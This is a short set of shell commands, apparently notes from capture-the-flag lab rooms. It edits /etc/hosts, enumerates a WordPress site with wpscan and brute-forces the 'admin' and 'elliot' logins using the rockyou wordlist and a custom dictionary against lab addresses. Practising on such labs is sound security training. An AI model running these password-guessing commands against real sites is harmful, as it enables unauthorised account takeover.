sudo nano /etc/hosts
wpscan --url http://10.10.97.188/wordpress -e
wpscan --url http://internal.thm/wordpress -U admin -P /usr/share/wordlists/rockyou.txt 
wpscan --url http://10.10.97.188 -P /home/arek/Downloads/fsocity.dic -U elliot